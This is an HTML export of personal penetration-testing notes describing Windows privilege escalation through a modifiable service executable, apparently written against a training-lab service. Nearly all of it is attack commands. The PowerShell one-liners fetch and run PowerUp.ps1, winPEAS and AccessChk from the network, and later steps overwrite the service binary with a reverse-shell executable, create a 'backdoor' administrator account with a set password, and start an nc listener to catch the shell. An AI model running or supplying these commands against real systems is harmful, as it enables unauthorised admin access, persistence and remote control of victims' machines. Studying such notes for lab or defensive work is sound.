<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>manual</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>manual</h1><br/><br />Github: <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1</a><br /><br />1. Check for service misconfigurations:<br />   ◇ <span style="text-decoration:underline;">PowerUp.ps1 with method Get-ModifiableServiceFile</span> <br />       Enumerates all services by querying the WMI win32_service class. For each service, it takes the pathname (aka binPath) and passes it to Get-ModifiablePath to determine if the current user has rights to modify the service binary itself or any associated arguments.<br />       If the associated binary (or any configuration files) can be overwritten, privileges may be able to be escalated.<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadstring(<span style="color:#333333;font-weight:400">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;</span>);<span style="color:#00117f;font-weight:400">Get-ModifiableServiceFile</span></pre></div><br />    <a href=""><img src="images/1162-1.png" alt="images/1162-1.png" /></a><br />   ◇ WinPeas: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />      <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe&quot;</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe quiet servicesinfo&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe&quot;</span>;</pre></div><br />      <a href=""><img src="images/1162-2.png" alt="images/1162-2.png" /></a><br /><br />2. Confirm that we can modify the file<br />   ◇ AccessChk:<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\accesschk.exe /accepteula -quvw &#39;C:\Program Files\File Permissions Service\filepermservice.exe&#39;&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.exe&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Eula.txt&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;</pre></div><br />    <a href=""><img src="images/1162-3.png" alt="images/1162-3.png" /></a><br /><br />3. Confirm that we can START/STOP the service<br />    ◇ AccessChk:<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\accesschk.exe /accepteula -uvqc filepermsvc&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.exe&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Eula.txt&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;</pre></div><br />    <a href=""><img src="images/1162-4.png" alt="images/1162-4.png" /></a><br /><br />4. Create a backup of the original service executable:<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">copy</span> <span style="color:#3ad900;font-weight:400">&quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</span> C<span style="color:#ff9d00;font-weight:700">:\</span>Temp</pre></div><br />5. Now we can overwrite the service executable, we have different possibilities:<br />   ◇ Copy the reverse shell executable to overwrite the service executable:<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">copy</span> <span style="color:#ff9d00;font-weight:700">/</span>Y C<span style="color:#ff9d00;font-weight:700">:\</span>PrivEsc<span style="color:#ff9d00;font-weight:700">\</span>reverse.exe <span style="color:#3ad900;font-weight:400">&quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</span></pre></div><br />   ◇ Create a new Administrator account<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadstring(<span style="color:#333333;font-weight:400">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;</span>);<span style="color:#00117f;font-weight:400">Install-ServiceBinary</span> <span style="color:#333333;font-weight:400">-Name</span> <span style="color:#333333;font-weight:400">&#39;filepermsvc&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>Command “net user backdoor Password123<span style="color:#ff9d00;font-weight:700">!</span> <span style="color:#ff9d00;font-weight:700">/</span>add &amp;&amp; timeout <span style="color:#ff9d00;font-weight:700">/</span>t <span style="color:#333333;font-weight:400">5</span> &amp;&amp; net localgroup Administrators backdoor <span style="color:#ff9d00;font-weight:700">/</span>add”</pre></div><br />    <br />6. Start a listener on Kali, and then start the service to trigger the exploit:<br />   1) Listener on kali<br />       <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -nvlp 53</pre></div><br />   2) Start the service<br />       <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> net start filepermsvc</pre></div><br />   <a href=""><img src="images/1162-5.png" alt="images/1162-5.png" /></a><br /><br /><br /><br />    <br /><br /><br /><br />Bibliography:<br />• <a href="https://pentestlab.blog/2017/03/30/weak-service-permissions/">https://pentestlab.blog/2017/03/30/weak-service-permissions/</a></div>
</body>
</html>
